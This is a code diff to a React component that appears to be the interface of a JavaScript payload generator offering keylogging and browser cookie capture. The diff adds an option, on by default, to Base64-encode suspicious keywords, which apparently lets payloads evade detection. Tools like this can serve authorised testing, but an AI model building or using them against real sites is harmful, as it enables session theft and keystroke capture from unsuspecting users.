@@ -523,6 +523,7 @@ class Javascript extends Component {
       keylogger: false,
       minify: true,
       obfuscate: false,
+      base64: true,
     }
   }
 
@@ -562,6 +563,7 @@ class Javascript extends Component {
     if (this.state.options.keylogger == true) params += "&keylogger=true"
     if (this.state.options.minify == true) params += "&minify=true"
     if (this.state.options.obfuscate == true) params += "&obfuscate=true"
+    if (this.state.options.base64 == false) params += "&base64=false"
     this.setState({
       javascriptURL: "/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
     })
@@ -677,6 +679,15 @@ class Javascript extends Component {
                     label="Capture browser cookies"
                   />
                   <Divider inset />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.base64}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, base64: checked } } )}
+                      />
+                    }
+                    label="Base64 encode suspicious keywords"
+                  />
                   <FormControlLabel
                     control={
                       <Switch
